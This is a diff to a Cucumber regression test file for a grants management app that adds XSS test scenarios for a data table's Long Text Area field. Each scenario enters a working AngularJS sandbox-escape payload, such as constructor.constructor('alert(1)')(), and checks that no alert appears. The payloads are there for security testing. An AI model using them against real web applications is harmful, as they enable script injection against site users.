@@ -1,4 +1,4 @@
-@US-296453 @regression-QA @Sprint-5-Year-2023
+@US-296453 @regression-QA @Sprint-5-Year-2023 @Year-2023
 Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
   Text Field of Data Table Enhanced, few script has to handle.
   Need to handle same scenario in PDF for CKEditor, Data Table and Data Table Enhanced. (Suite ID: 304363)
@@ -7136,10 +7136,2683 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
       | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
       | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
 
+
+  @307080 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                                                                                                                                                                 | Field                          |
+      | {{!ready && (ready = true) && (!call? $$watchers[0].get(toString.constructor.prototype): (a = apply) && (apply = constructor) &&(valueOf = call) &&(''+''.toString('F = Function.prototype;' +'F.apply = F.a;' +'delete F.a;' +'delete F.valueOf;' +'alert(1);')));}} | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307100 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                            | Field                          |
+      | {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}} | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307105 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                  | Field                          |
+      | {{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}} | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307106 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                             | Field                          |
+      | {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}} | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307108 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                      | Field                          |
+      | {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307109 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                           | Field                          |
+      | {{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}} | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307110 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | Field                          |
+      | {{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}} | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307113 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                                                                                                                                                                                                                                  | Field                          |
+      | {{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='alert(1)';astNode.argument={type:'Identifier'};");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}} | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307121 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                     | Field                          |
+      | {{constructor.constructor('alert(1)')()}} | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307123 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                             | Field                          |
+      | {{$on.constructor('alert(1)')()}} | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307125 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                 | Field                          |
+      | constructor.constructor('alert(1)')() | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307126 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                  | Field                          |
+      | a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307133 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                                                                                                                                                                                                                         | Field                          |
+      | {}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')() | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307134 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                | Field                          |
+      | {}.")));alert(1)//"; | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307136 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                | Field                          |
+      | {}.")));alert(1)//"; | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307139 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
